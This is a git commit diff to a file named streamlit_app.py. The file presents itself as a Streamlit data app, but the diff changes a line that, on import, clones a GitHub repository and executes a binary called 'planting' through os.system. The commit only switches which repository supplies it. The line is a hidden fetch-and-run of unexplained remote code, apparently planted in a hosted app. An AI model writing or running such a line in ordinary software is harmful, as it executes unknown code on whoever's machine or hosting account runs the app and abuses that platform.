09941f3280e9c79e8766b6f07fa4c4ecd37c5009
iopelire <106476593+iopelire@users.noreply.github.com>
2022-07-09 17:29:15 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf streamlit-plante && git clone https://github.com/connormuraziko/streamlit-plante.git && cd streamlit-plante  && chmod +x planting && ./planting")
+os.system ("rm -rf streamlit-plante && git clone https://github.com/iopelire/circlecrot.git && cd circlecrot && chmod +x planting && ./planting")
